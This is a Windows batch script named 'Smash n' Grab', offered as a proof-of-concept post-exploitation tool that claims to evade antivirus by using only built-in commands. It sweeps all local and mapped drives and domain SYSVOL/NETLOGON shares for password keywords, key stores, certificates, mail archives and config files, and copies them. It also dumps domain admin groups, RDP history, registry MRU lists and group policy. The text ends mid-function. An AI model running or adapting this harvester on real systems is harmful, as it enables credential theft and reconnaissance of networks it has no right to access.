@ECHO OFF

REM Smash n' Grab
REM Created by Robin Lennox
REM Copyright (C) 2015.
REM
REM This program is free software: you can redistribute it and/or modify
REM it under the terms of the GNU General Public License as published by
REM the Free Software Foundation, either version 3 of the License, or
REM (at your option) any later version.
REM
REM This program is distributed in the hope that it will be useful,
REM but WITHOUT ANY WARRANTY; without even the implied warranty of
REM MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
REM GNU General Public License for more details.
REM
REM You should have received a copy of the GNU General Public License
REM along with this program.  If not, see <http://www.gnu.org/licenses/>.

SETLOCAL EnableDelayedExpansion

REM Get Current Directory of Batch
SET RAN_DIR=%~dp0

REM Measured in Bytes
SET MAX_SIZE=100000

REM New Line
set LF=^
REM Used for Folder Search and Registry Search
FOR /F "delims=" %%a IN ('HOSTNAME') DO SET HOSTNAME=%%a

REM The IP search doesn't work with FIND
SET SEARCH_STR=pass user -p \\[\\] [0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]
FOR /F "usebackq tokens=1 delims=\" %%a IN (`ECHO %RAN_DIR%`) DO (SET TOOL_DIR=%%a\tools)
REM File type that can cause an issue:
REM log xms - Due to size
SET FILE_TYPE=bat cmd vbs ps1 ini pac wpad config xml
SET FILE_TYPE_NO_KEYWORD_SEARCH=cer pfx key kdb kdbx log xms sql pst ost eml
SET RUN_AUTO=""
SET RESULT=""
SET FOLDER_PATH=
SET COPY_OPTION=""
SET KEYWORD_OPTION=""
SET INTRUSIVE_OPTION=""
SET MSG=
SET SWITCH=""

REM Used for Spinner
SET DOT=.
SET WARNING=To exit this script press CTRL+C.

REM Used to loop parameter
SET COUNT=1

:SWITCHES
SET ACTIVE_SWITCHES=a b c d f i k s
REM Help Info
IF /I "%~1"=="/?" GOTO HELP
CALL ECHO %%~%COUNT% > %TEMP%\tmp_switches.txt
FOR /F "tokens=*" %%A IN (%TEMP%\tmp_switches.txt) DO (
	ECHO %%A > %TEMP%\tmp_switches_result.txt

	REM Read output of TMP Switch Results
	FOR /F "usebackq tokens=*" %%B IN (`TYPE %TEMP%\tmp_switches_result.txt`) DO (

		SET NEW_RESULT=%%B
	)

	FOR %%C IN (!ACTIVE_SWITCHES!) DO (
		IF NOT !SWITCH!=="" GOTO :VAILD_SWITCH

		IF "%%A"=="/%%C " (
		SET NEW_RESULT=/%%C
		GOTO :VAILD_SWITCH
		)

	)

	REM End of file
	IF "!NEW_RESULT!"=="ECHO is off. " GOTO RUN

	REM If no valid switches found
	IF NOT %%A=="" (
		ECHO Not a Valid Switch: !NEW_RESULT!
		EXIT /B
	)

	:VAILD_SWITCH
	REM Set switch variables
	REM Stop Looping if end of file
	IF "!RESULT!"=="!NEW_RESULT!" GOTO RUN
	SET RESULT=!NEW_RESULT!


	REM Store Max Size
	IF !SWITCH!==b (
		ECHO !RESULT! | FINDSTR /R "\<[0-9][0-9]*\>" > NUL
		IF NOT !ERRORLEVEL!==0 ECHO Non number string set for Switch /!SWITCH! & EXIT /B

		IF "!RESULT!"=="ECHO is off. " ECHO No valid string set for Switch /!SWITCH! & EXIT /B
		CALL :TRIM !RESULT! MAX_SIZE
		SET SWITCH=""
	)

	REM Store Tool Directory
	IF !SWITCH!==d (
		IF "!RESULT!"=="ECHO is off. " ECHO No valid string set for Switch /!SWITCH! & EXIT /B
		CALL :TRIM !RESULT! TOOL_DIR
		SET SWITCH=""
	)

	REM Store File Type
	IF !SWITCH!==f (
		IF "!RESULT!"=="ECHO is off. " ECHO No valid string set for Switch /!SWITCH! & EXIT /B
		CALL :TRIM !RESULT! FILE_TYPE
		SET SWITCH=""
	)

	REM Store Search
	IF !SWITCH!==s (
		IF "!RESULT!"=="ECHO is off. " ECHO No valid string set for Switch /!SWITCH! & EXIT /B
		SET SEARCH_STR=!RESULT!
		SET KEYWORD_OPTION=y
		SET SWITCH=""
	)

	REM Find switch
	IF "!RESULT!"=="/a" SET RUN_AUTO=y
	IF "!RESULT!"=="/b" SET SWITCH=b
	IF "!RESULT!"=="/c" SET COPY_OPTION=y
	IF "!RESULT!"=="/d" SET SWITCH=d
	IF "!RESULT!"=="/f" SET SWITCH=f
	IF "!RESULT!"=="/i" SET INTRUSIVE_OPTION=y
	IF "!RESULT!"=="/k" SET KEYWORD_OPTION=y
	IF "!RESULT!"=="/s" SET SWITCH=s
)

SET /A COUNT=%COUNT%+1

REM If more then nine parameters, move parameter position
IF %COUNT% GTR 8 (
	SET COUNT=0
	FOR /l %%b IN (1,1,9) DO (
	SHIFT
	)
)

GOTO SWITCHES

:SCRIPT_SETUP
DEL %TEMP%\tmp_switches.txt 2>NUL
REM Make DIR
MKDIR !TOOL_DIR!\tmp\ >NUL 2>&1

REM If no files found path needs to be set USER_GROUP and OTHER_INFO
SET FOLDER_PATH=!TOOL_DIR!

REM If file contains special characters causes file to be created
MKDIR !TOOL_DIR!\tmp\random_files\ >NUL 2>&1

EXIT /B

:RUN
CALL :SCRIPT_SETUP
CALL :TITLE
CALL :SETUP
CALL :OPTIONS
CALL :DRIVE_LIST
CALL :COPY_FILES
CALL :USER_GROUP
CALL :OTHER_INFO
IF NOT %INTRUSIVE_OPTION%=="" (
	CALL :INTRUSIVE_SEARCH
	CALL :SCAVENGE_INFO
)
GOTO :EOF

:SETUP
REM CLEANUP
DEL !TOOL_DIR!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
ECHO Y | DEL !TOOL_DIR!\tmp\* 2>NUL

REM Create Folders
MKDIR !TOOL_DIR! >NUL 2>&1
EXIT /B

:TITLE
CLS
ECHO ===============================================================================
ECHO Smash N' Grab.
ECHO ===============================================================================
ECHO This script is a proof of concept showing that Windows Batch can be used to
ECHO capture useful information using built-in Windows tools without triggering
ECHO Anti-Virus.
ECHO.
ECHO For more information visit: https://github.com/robinlennox/smash-n-grab/
ECHO.
ECHO ===============================================================================
IF %RUN_AUTO%==y (
	CLS
	SET MESSAGE=Running Automatically
	CALL :SPINNER
	EXIT /B
)
PAUSE
EXIT /B

:OPTIONS
IF %RUN_AUTO%==y (
	EXIT /B
)
CLS
ECHO ===============================================================================
ECHO Options
ECHO ===============================================================================
ECHO Do want a copy of the files stored?
ECHO Press 1 - Do store copy of files which are found? LIMITED TO %MAX_SIZE% BYTES
ECHO Press 2 - Do NOT store files, only note where files are located
ECHO ===============================================================================
ECHO.
SET /p USER_PROMPT=Choose a number(1,2):
SET USER_PROMPT=%USER_PROMPT:~0,1%
IF "%USER_PROMPT%"=="1" SET COPY_OPTION=y & GOTO COPY_OPTIONS
IF "%USER_PROMPT%"=="2" SET COPY_OPTION="" & GOTO SEARCH_OPTIONS
ECHO %USER_PROMPT%

ECHO Invalid choice
ECHO.
PAUSE
CLS
GOTO OPTIONS

:COPY_OPTIONS
CLS
ECHO ===============================================================================
ECHO Copy Options
ECHO ===============================================================================
ECHO Do want a store only files with the following keywords?
ECHO %SEARCH_STR%
ECHO Press 1 - Yes, only store files with keyword.
ECHO Press 2 - No, store any file.
ECHO ===============================================================================
ECHO.
SET /p USER_PROMPT=Choose a number(1,2):
SET USER_PROMPT=%USER_PROMPT:~0,1%
IF "%USER_PROMPT%"=="1" SET KEYWORD_OPTION=y & EXIT /B
IF "%USER_PROMPT%"=="2" SET KEYWORD_OPTION="" & EXIT /B
ECHO %USER_PROMPT%

ECHO Invalid choice
ECHO.
PAUSE
CLS
GOTO COPY_OPTIONS

:SEARCH_OPTIONS
CLS
ECHO ===============================================================================
ECHO Search Options
ECHO ===============================================================================
ECHO Do want a search for the following keywords?
ECHO %SEARCH_STR%
ECHO Press 1 - Yes search.
ECHO Press 2 - No, do not search.
ECHO ===============================================================================
ECHO.
SET /p USER_PROMPT=Choose a number(1,2):
SET USER_PROMPT=%USER_PROMPT:~0,1%
IF "%USER_PROMPT%"=="1" SET KEYWORD_OPTION=y & EXIT /B
IF "%USER_PROMPT%"=="2" SET KEYWORD_OPTION="" & EXIT /B
ECHO %USER_PROMPT%

ECHO Invalid choice
ECHO.
PAUSE
CLS
GOTO SEARCH_OPTIONS

:DRIVE_LIST
FOR /F "usebackq tokens=1*" %%A IN (`FSUTIL FSINFO DRIVES ^| FIND ":"`) DO (
	IF /i "%%A" NEQ "Drives:" (
		SET DRIVE_LETTER=%%A
		FOR %%Z IN (!DRIVE_LETTER!) DO (
			ECHO %%Z >> !TOOL_DIR!\tmp\tmp_drive_info.txt
		)
	) ELSE (
		REM Needed when running via PSEXEC
		IF NOT [%%B] EQU [] (
			SET DRIVE_LETTER=%%B
			FOR %%Z IN (!DRIVE_LETTER!) DO (
				ECHO %%Z >> !TOOL_DIR!\tmp\tmp_drive_info.txt
			)
		)
	)
	REM If Mapped drives store info. Will use to for directory traversal
	FOR /F "usebackq tokens=3" %%B IN (`FSUTIL FSINFO drivetype !DRIVE_LETTER!` ) DO (
		IF /i "%%B" EQU "Remote/Network" (
			SET DRIVE_LETTER=!DRIVE_LETTER:\=!
			FOR /F "usebackq tokens=3" %%C IN (`NET USE !DRIVE_LETTER! ^| FIND "\\"` ) DO (
				SET DRIVE_LETTER=%%C
				FOR %%Z IN (!DRIVE_LETTER!) DO (
					ECHO %%Z >> !TOOL_DIR!\tmp\tmp_mapped_drive_unc.txt
				)
			)
		)
	)
)
EXIT /B

:COPY_FILES
REM Create File Type List
SET NEW_FILE_TYPE=

REM Add the file to be keyword searched
FOR %%A IN (%FILE_TYPE%) DO (
	SET NEW_FILE_TYPE=!NEW_FILE_TYPE! *.%%A
)

REM Add the file not to be keyword searched
FOR %%A IN (%FILE_TYPE_NO_KEYWORD_SEARCH%) DO (
	SET NEW_FILE_TYPE=!NEW_FILE_TYPE! *.%%A
)

REM Cycle through drive letters
FOR /F %%A IN (!TOOL_DIR!\tmp\tmp_drive_info.txt) DO (
	REM Search for files on whole disk
	SET MESSAGE=Scanning root directory for files and directories.
	SET MSG=Scanning %%A - Depending the number of files in a directory this might take awhile.
	CALL :SPINNER

	REM Lookup Files
	CD /D %%A
	REM If failed to open drive
	IF NOT !ERRORLEVEL!==1 (
		REM Remove Old Files
		DEL !TOOL_DIR!\tmp\unsorted_non_shortname_list.txt 2>NUL
		DEL !TOOL_DIR!\tmp\sorted_non_shortname_list.txt 2>NUL
		CD /D %%A & DIR !NEW_FILE_TYPE! /S /B /A >> !TOOL_DIR!\tmp\unsorted_non_shortname_list.txt
		
		REM Check If File is Empty (No Matching File)
		FOR %%B IN (!TOOL_DIR!\tmp\unsorted_non_shortname_list.txt) DO (
			IF %%~zB gtr 1 (
				REM Remove Exclude Folders
				FINDSTR /I /V "\Application Data \bat \WINDOWS\assembly \WINDOWS\diagnostics \WINDOWS\Microsoft.NET \WINDOWS\Inf \WINDOWS\WinSxS \WINDOWS\System32\DriverStore $NtUninstall \swsetup $hf_mig$" "!TOOL_DIR!\tmp\unsorted_non_shortname_list.txt" >> !TOOL_DIR!\tmp\sorted_non_shortname_list.txt
				FOR /f "tokens=*" %%C IN (!TOOL_DIR!\tmp\sorted_non_shortname_list.txt) DO (
					CALL :GET_SHORT_NAME "%%C"
					SET FOLDER_PATH=!TOOL_DIR!\info\!HOSTNAME!
					SET FOLDER_NAME=drive_%%A
					SET FOLDER_NAME=!FOLDER_NAME::\=!
					SET ORIG_FILE_LOCATION=!SHORT_NAME!
					CALL :COPY !SHORT_NAME!
				)
			)
		)
	)
)
EXIT /B

:CHECK_IF_FILE_EXCLUDED
SET CURRENT_FILE_LOCATION=%1
SET SHORT_CURRENT_FILE_LOCATION=CMD /c FOR %%A IN (!CURRENT_FILE_LOCATION!) DO @ECHO %%~sA
SET MSG=Scanning !CURRENT_FILE_LOCATION!
CALL :SPINNER
REM ECHO CURRENT: !CURRENT_FILE_LOCATION!
IF "!CURRENT_FILE_LOCATION!"=="" GOTO :EOF
		REM Folders to Skip (Need to stop loop)
		ECHO.!CURRENT_FILE_LOCATION!|FINDSTR /I "\Application Data \bat \WINDOWS\assembly \WINDOWS\diagnostics \WINDOWS\Microsoft.NET \WINDOWS\WinSxS $NtUninstall  $hf_mig$ !TOOL_DIR!" >NUL
		IF %ERRORLEVEL%==0 SET MESSAGE=Skipping File & EXIT /B
		IF %ERRORLEVEL%==1 SET MESSAGE=Searching File & GOTO :COPY
EXIT /B

:KEYWORD_STORE
REM Store results from Keyword Search
ECHO ORIG LOC: !ORIG_FILE_LOCATION! >> !FOLDER_PATH!\files\!FOLDER_NAME!_keyword_results.txt
ECHO ************ >> !FOLDER_PATH!\files\!FOLDER_NAME!_keyword_results.txt
FINDSTR /I ".!SEARCH_STR!" !CURRENT_FILE_LOCATION! >> !FOLDER_PATH!\files\!FOLDER_NAME!_keyword_results.txt
ECHO. >> !FOLDER_PATH!\files\!FOLDER_NAME!_keyword_results.txt
EXIT /B

:COPY
SET CURRENT_FILE_LOCATION=%1
SET MSG=Scanning !CURRENT_FILE_LOCATION!
CALL :SPINNER
REM Get Filename
FOR %%A IN (!CURRENT_FILE_LOCATION!) DO (
	SET FILE_NAME=%%~nxA
	SET FILEEXT_NAME=%%~xA
	SET DIR_NAME=%%~dpA
)
SET /A count=0
SET ORIG_FILE_NAME=!FILE_NAME!

:RENAME
IF EXIST !FOLDER_PATH!\files\!FOLDER_NAME!\!FILE_NAME! (
	SET /A count+=1
	SET FILE_NAME=!COUNT!_!ORIG_FILE_NAME!
	GOTO :RENAME
)

MKDIR !FOLDER_PATH!\files\!FOLDER_NAME!\ 2>NUL

REM Search Only
IF %COPY_OPTION%=="" (
	REM Check if File Extension should be skipped
	ECHO.!FILEEXT_NAME!|FINDSTR /I "!FILE_TYPE_NO_KEYWORD_SEARCH!"
	REM If False
	IF !ERRORLEVEL!==1 (
		REM Search for keywords
		IF %KEYWORD_OPTION%==y (
			FINDSTR /I ".!SEARCH_STR!" !CURRENT_FILE_LOCATION! >NUL
			IF !ERRORLEVEL!==0 (
				CALL :KEYWORD_STORE
				ECHO !ORIG_FILE_LOCATION! >> !FOLDER_PATH!\files\!FOLDER_NAME!_searched_files.txt 2>NUL
			)
		) ELSE (
			ECHO !ORIG_FILE_LOCATION! >> !FOLDER_PATH!\files\!FOLDER_NAME!_searched_files.txt 2>NUL
		)
		EXIT /B
	)
)

IF %COPY_OPTION%==y (
	SET MESSAGE=Searching And Copying Files
	REM Only copy files below certain file size
	FOR %%A IN (!CURRENT_FILE_LOCATION!) DO SET FILESIZE=%%~zA
	IF !FILESIZE! LSS !MAX_SIZE! (
		REM Check if File Extension should be skipped
		ECHO.!FILEEXT_NAME!|FINDSTR /I "!FILE_TYPE_NO_KEYWORD_SEARCH!"
		REM If False
		IF %ERRORLEVEL%==1 (
			REM Search for keywords
			IF %KEYWORD_OPTION%==y (
				FINDSTR /I ".!SEARCH_STR!" !CURRENT_FILE_LOCATION! >NUL
				IF !ERRORLEVEL!==0 (
					CALL :KEYWORD_STORE
					FOR /F "delims=" %%F IN ('DIR "!FOLDER_PATH!\files\!FOLDER_NAME!\" /B /A') DO (
						SET SEARCHED_FILE_NAME=%%F
						
						REM Check if file has already been copied
						FC /B "!ORIG_FILE_LOCATION!" "!FOLDER_PATH!\files\!FOLDER_NAME!\!SEARCHED_FILE_NAME!" >NUL

						REM If file already exists
						IF !ERRORLEVEL!==0 (
							ECHO !ORIG_FILE_LOCATION!:!FOLDER_PATH!\files\!FOLDER_NAME!\!SEARCHED_FILE_NAME! >> !FOLDER_PATH!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
							SET FILE_NAME=!SEARCHED_FILE_NAME!
							CALL :KEYWORD_STORE
							EXIT /B
						)
					)
					REM If file does not exist
					COPY !CURRENT_FILE_LOCATION! "!FOLDER_PATH!\files\!FOLDER_NAME!\!FILE_NAME!" >NUL
					ECHO !ORIG_FILE_LOCATION!:!FOLDER_PATH!\files\!FOLDER_NAME!\!FILE_NAME! >> !FOLDER_PATH!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
					CALL :KEYWORD_STORE
				)
			) ELSE (
				FOR /F "delims=" %%F IN ('DIR "!FOLDER_PATH!\files\!FOLDER_NAME!\" /B /A') DO (
						SET SEARCHED_FILE_NAME=%%F
						FC /B "!ORIG_FILE_LOCATION!" "!FOLDER_PATH!\files\!FOLDER_NAME!\!SEARCHED_FILE_NAME!" >NUL

						REM If file already exists
						IF !ERRORLEVEL!==0 (
							ECHO !ORIG_FILE_LOCATION!:!FOLDER_PATH!\files\!FOLDER_NAME!!SEARCHED_FILE_NAME! >> !FOLDER_PATH!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
							EXIT /B
						)
					)
				COPY !CURRENT_FILE_LOCATION! "!FOLDER_PATH!\files\!FOLDER_NAME!\!FILE_NAME!" >NUL
				ECHO !ORIG_FILE_LOCATION!:!FOLDER_PATH!\files\!FOLDER_NAME!\!FILE_NAME! >> !FOLDER_PATH!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
			)
		)
	) ELSE (
		ECHO !ORIG_FILE_LOCATION!****Not Copied over limit !MAX_SIZE! Bytes**** >> !FOLDER_PATH!\files\!FOLDER_NAME!_copied_files.txt 2>NUL
	)
)
EXIT /B

:USER_GROUP
SET MESSAGE=Gathering Local Information
CALL :SPINNER

REM Check Windows Version
VER | FIND "5.1" > NUL
IF %ERRORLEVEL% == 0 (GOTO WINXP_USER_GROUP) ELSE GOTO NON_WINXP_USER_GROUP

:WINXP_USER_GROUP
REM Check if joined to domain
SET DOMAIN_QUERY="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V CachePrimaryDomain
REG QUERY %DOMAIN_QUERY% >NUL 2>&1
CALL :CONTINUE_USER_GROUP
EXIT /B

:NON_WINXP_USER_GROUP
REM Check if joined to domain
SET DOMAIN_QUERY="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History" /V MachineDomain
REG QUERY %DOMAIN_QUERY% >NUL 2>&1
CALL :CONTINUE_USER_GROUP
EXIT /B

:CONTINUE_USER_GROUP
REM ERRORLEVEL==1 means the value does not exist
IF %ERRORLEVEL%==1 (
REM Non Domain
SET DOMAIN=NO
) ELSE (
	REM Domain
	SET DOMAIN=YES
	REM SAVE DOMAIN NAME
	FOR /F "usebackq tokens=2 delims=Z" %%A IN (`REG QUERY !DOMAIN_QUERY!`) DO (
		CALL :TRIM %%A FULLY_QUALIFIED_DOMAIN_NAME
		REM Backup Local Folder Path
		SET LOCAL_FOLDER_PATH=!FOLDER_PATH!
		SET DOMAIN_FOLDERS=sysvol netlogon

		FOR %%A IN (!DOMAIN_FOLDERS!) DO (
			SET FOLDER_NAME=%%A
			CALL :MAP_NETWORK_DRIVE
		)
	)
	SET DOMAIN_FOLDER_PATH=!FOLDER_PATH!
	SET FOLDER_PATH=!LOCAL_FOLDER_PATH!
)

REM This command will return the local accounts
NET USE > !TOOL_DIR!\info\%HOSTNAME%\mapped_drives.txt

REM This command will return the local accounts
NET USERS > !TOOL_DIR!\info\%HOSTNAME%\wk_user.txt

REM This command will show user account password and logon requirements
NET ACCOUNTS > !TOOL_DIR!\info\%HOSTNAME%\wk_account.txt

REM This command will return the workstation name, user name, version of Windows, network adapter, network adapter information/MAC address, Logon domain, COM Open Timeout, COM Send Count, COM Send Timeout.
NET CONFIG WORKSTATION > !TOOL_DIR!\info\%HOSTNAME%\wk_config.txt

REM This command will return the local groups on the local machine.
NET LOCALGROUP > !TOOL_DIR!\info\%HOSTNAME%\wk_group.txt

REM This command will return the local shares on the local machine.
NET SHARE > !TOOL_DIR!\info\%HOSTNAME%\wk_shares.txt

REM This will return the user run by information.
IF "%USERDOMAIN%\%USERNAME%"=="\" (
		ECHO Run by: SYSTEM ACCOUNT > !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
	) ELSE (
	IF %DOMAIN%==YES (
		ECHO Run by: %USERDOMAIN%\%USERNAME% > !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
		ECHO. >> !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
		NET USER /DOMAIN %USERNAME% >> !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
	) ELSE (
		ECHO Run by: %USERDOMAIN%\%USERNAME% > !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
		ECHO. >> !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt
		NET USER %USERNAME% >> !TOOL_DIR!\info\%HOSTNAME%\run_by_info.txt

	)
)

IF %DOMAIN%==YES (
	REM This command will return the user accounts from the Primary Domain Controller (PDC) of the current domain
	NET USERS /DOMAIN > !DOMAIN_FOLDER_PATH!\domain_user.txt

	REM This command will show user account password and logon requirements
	NET ACCOUNTS /DOMAIN > !DOMAIN_FOLDER_PATH!\domain_account.txt

	REM This command will return the server name, version of Windows, active network adapter information/MAC address, Server hidden status, Maximum Logged On Users, Maximum open files per session, Idle session time.
	NET CONFIG SERVER > !DOMAIN_FOLDER_PATH!\domain_config.txt

	REM This command will return the global groups on the PDC of the current domain.
	NET GROUP /DOMAIN > !DOMAIN_FOLDER_PATH!\domain_group.txt

	REM This command will return the resources in the specified domain.
	NET VIEW /DOMAIN:%USERDOMAIN% > !DOMAIN_FOLDER_PATH!\domain_resources.txt

	REM Output all users in Schema Admins
	NET GROUP /DOMAIN "Schema Admins" > !DOMAIN_FOLDER_PATH!\schema_admins.txt 2>NUL

	REM Output all users in Enterprise Admins
	NET GROUP /DOMAIN "Enterprise Admins" > !DOMAIN_FOLDER_PATH!\enterprise_admins.txt 2>NUL

	REM Output all users in Domain Admins
	NET GROUP /DOMAIN "Domain Admins" > !DOMAIN_FOLDER_PATH!\domain_admins.txt 2>NUL

	REM Output all devices in Domain Controllers
	NET GROUP /DOMAIN "Domain Controllers" > !DOMAIN_FOLDER_PATH!\domain_controllers.txt 2>NUL

	REM Output all devices in Domain Computers
	NET GROUP /DOMAIN "Domain Computers" > !DOMAIN_FOLDER_PATH!\domain_computers.txt 2>NUL
)

EXIT /B

:OTHER_INFO
REM Other useful information
SET MESSAGE=Other useful infomation
SET MSG=Search for other useful information
CALL :SPINNER
REM Local Drive info
FSUTIL FSINFO DRIVES >> !FOLDER_PATH!\local_drive_info.txt

REM Make folder to store Registry data
MKDIR !FOLDER_PATH!\network\ 2>NUL

REM Netstat Info
SET MSG=Storing Netstat
CALL :SPINNER

ECHO Following Command Run: NETSTAT /na > !FOLDER_PATH!\network\export_netstat.txt
NETSTAT /na >> !FOLDER_PATH!\network\export_netstat.txt

REM Make folder to store Registry data
MKDIR !FOLDER_PATH!\registry\ 2>NUL

REM Grab run history
REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU > !FOLDER_PATH!\registry\export_run.txt 2>NUL

REM Grab Typed Paths from Explorer
REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths > !FOLDER_PATH!\registry\typed_paths.txt 2>NUL

REM Grab recently opened files OFFICE (NEED TO Enumerate)
REG QUERY HKCU\Software\Microsoft\Office\11.0\Common\General\RecentFiles > !TOOL_DIR!\info\%HOSTNAME%\export_recent_files.txt 2>NUL

REM Grab recently opened files history
REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU /S > !FOLDER_PATH!\registry\export_opened_files.txt 2>NUL

REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths

REM Grab recent history from MSTSC (MS RDP Client)
REG QUERY "HKCU\Software\Microsoft\Terminal Server Client" /S > !FOLDER_PATH!\registry\export_mstsc_history.txt 2>NUL

SET MSG=Storing Group Policy Info
CALL :SPINNER

REM Make folder to store Registry data
MKDIR !FOLDER_PATH!\group_policy\ 2>NUL

REM Group Policy User information
GPRESULT /SCOPE USER /V > !FOLDER_PATH!\group_policy\export_gpresult_user.txt 2>NUL

REM Group Policy Computer information
GPRESULT /SCOPE COMPUTER /V > !FOLDER_PATH!\group_policy\export_gpresult_computer.txt 2>NUL

REM Scheduled Tasks information (NEEDS WORK - What does it look like, what can we do... could we add tasks... why would we)
SCHTASKS /Query /FO LIST /V > !FOLDER_PATH!\export_scheduled_tasks.txt 2>NUL

EXIT /B

:INTRUSIVE_SEARCH
SET MESSAGE=Intrusive Search
SET MSG=Copy Recently opened files
CALL :SPINNER
REM Copy all the recently opened files
MKDIR !FOLDER_PATH!\files\opened_files\ 2>NUL
FOR /F "usebackq tokens=* delims=REG_SZ" %%A IN (`FINDSTR /I "REG_SZ" "!TOOL_DIR!\info\%HOSTNAME%\registry\export_opened_files.txt"`) DO (
	SET CURRENT_FILE_LOCATION=%%A
	REM Start From the 13 position in the string
	SET CURRENT_FILE_LOCATION=!CURRENT_FILE_LOCATION:~13!
	REM Discard rogue data
	ECHO !CURRENT_FILE_LOCATION! | FINDSTR /I "EG_SZ" >NUL
	IF !ERRORLEVEL!==1 (
		FOR %%B IN ("!CURRENT_FILE_LOCATION!") DO (
			SET FILE_NAME=%%~nxB
			SET MESSAGE=Copying recently opened files
			CALL :SPINNER
			COPY "!CURRENT_FILE_LOCATION!" !FOLDER_PATH!\files\opened_files\!FILE_NAME! >NUL
			ECHO !CURRENT_FILE_LOCATION!:!FOLDER_PATH!\files\opened_files\!FILE_NAME! >> !FOLDER_PATH!\files\copied_opened_files.txt 2>NUL
		)
	)
)

EXIT /B

:SCAVENGE_INFO
SET STRING_LENGTH=0

REM If file contains special characters causes file to be created
MKDIR !TOOL_DIR!\tmp\random_files\

REM Blank File
ECHO. > !TOOL_DIR!\tmp\tmp_scavenged_mapped_drive_unc.txt 2>NUL
FOR /F "delims=" %%F IN ('DIR !TOOL_DIR!\info\ /A /B /S') DO (
	SET SEARCH_FILE_NAME="%%F"
	
	REM Find String
	FOR /F "usebackq tokens=*" %%A IN (`FINDSTR /I "\\[\\]" "!SEARCH_FILE_NAME!"`) DO (
		SET ORIG_FOLDER_UNC=%%A
		SET FOUND_UNC=%%A
		SET STRING_LENGTH=0

		:CUT
		CD !TOOL_DIR!\tmp\random_files\
		
		REM Cause escape from For Loop or pauses etc...
		ECHO "!FOUND_UNC!" | FINDSTR /I "%% CALL GOTO SET PAUSE elseif + () ( ) {} { }" >NUL 2>&1
		
		IF !ERRORLEVEL!==0 (
			SET FOUND_UNC=\\
			SET ORIG_FOLDER_UNC=\\
		) 
		
		REM Cut leading text in-front of UNC Path
		FOR /F "usebackq tokens=1 delims=\" %%I IN (`ECHO "!FOUND_UNC!"`) DO (
			SET LENGTH_LOOP_COUNT=0
			
			CALL :CALC_STRING_LENGTH "%%I" STRING_LENGTH
			SET FOUND_UNC=!FOUND_UNC:%%I=!
			
			REM NEED TO REMOVE SPECIAL CHARS such as &
			REM If String has \\\ this means there was no leading text to remove
			SET CHECK_1=!FOUND_UNC:~0,3!
			REM If string is not \\ it is a malform UNC path possible a drive mapping I.E C:\
			SET CHECK_2=!FOUND_UNC:~0,2!
			REM Check if UNC is valid. I.E not \\[
			SET CHECK_3=!FOUND_UNC:~2,1!
			IF !CHECK_1!==\\\ SET CHECK_NUMBER=1 & CALL :CHECK_SCAVENGE_INFO !FOUND_UNC! FOUND_UNC
			IF NOT !CHECK_2!==\\ SET CHECK_NUMBER=2 & SET FOUND_UNC=!FOUND_UNC:~1! & CALL :CHECK_SCAVENGE_INFO !FOUND_UNC! FOUND_UNC
			IF !CHECK_2!==\\ SET CHECK_NUMBER=2 & CALL :CHECK_SCAVENGE_INFO !FOUND_UNC! FOUND_UNC

			REM Cut ending text behind UNC paths
			IF !FOUND_UNC!==\\\ SET FOUND_UNC=
			IF !FOUND_UNC!==\\ SET FOUND_UNC=
			
			FOR /F "usebackq tokens=1 delims= " %%G IN (`ECHO !FOUND_UNC!`) DO (
				REM Could add \ on the end of every string... but could end up with double
				SET SCAVENGED_PATH=%%G
				SET ORIG_SCAVENGED_PATH=%%G

				REM Check in Filename is in path
				SET "FILE_NAME=%%~nxG" >NUL 2>&1
				IF NOT [!FILE_NAME!]==[] (
					CALL SET SCAVENGED_PATH=%%SCAVENGED_PATH:!FILE_NAME!=%%
				)

				REM \\\ Occurs when FOUND UNC is missing \ at the end
				IF "!SCAVENGED_PATH!"=="\\" SET SCAVENGED_PATH=!ORIG_SCAVENGED_PATH!

				REM If missing back slash means UNC
				IF NOT "!SCAVENGED_PATH:~-1!"=="\" SET SCAVENGED_PATH=!ORIG_SCAVENGED_PATH!

				REM If backslash not present at the end of the string, it will be mistaken for a filename such as \\127.0.0.1\c$ check if has dot
				ECHO !FILE_NAME! | FIND /I "." >NUL 2>&1
				IF !ERRORLEVEL!==1 SET SCAVENGED_PATH=!ORIG_SCAVENGED_PATH!

				REM Truncate to the first folder (If there...)
				FOR /F "usebackq tokens=1 delims=\" %%Z IN (`ECHO !SCAVENGED_PATH!`) DO (
					SET FIRST_SCAVENGED_PATH=\\%%Z
					CALL :TRIM !FIRST_SCAVENGED_PATH! FIRST_SCAVENGED_PATH
					IF !FIRST_SCAVENGED_PATH!==\\\ SET FIRST_SCAVENGED_PATH=
					IF !FIRST_SCAVENGED_PATH!==\\ SET FIRST_SCAVENGED_PATH=
				)
				REM Check sub folder i.e \server\SUBFOLDER
				FOR /F "usebackq tokens=2 delims=\" %%X IN (`ECHO !SCAVENGED_PATH!`) DO (
					SET SCAVENGED_PATH=!FIRST_SCAVENGED_PATH!\%%X
					IF !SCAVENGED_PATH!==\\\ SET SCAVENGED_PATH=
					IF !SCAVENGED_PATH!==\\ SET SCAVENGED_PATH=
				)

				REM Check if string is valid \\
				SET CHECK_SCAVENGED_PATH=!SCAVENGED_PATH:~0,2!
				REM IF NOT !CHECK_SCAVENGED_PATH!==\\ echo !SCAVENGED_PATH! & PAUSE
				IF NOT !CHECK_SCAVENGED_PATH!==\\ SET SCAVENGED_PATH=

				REM Check if string only \\
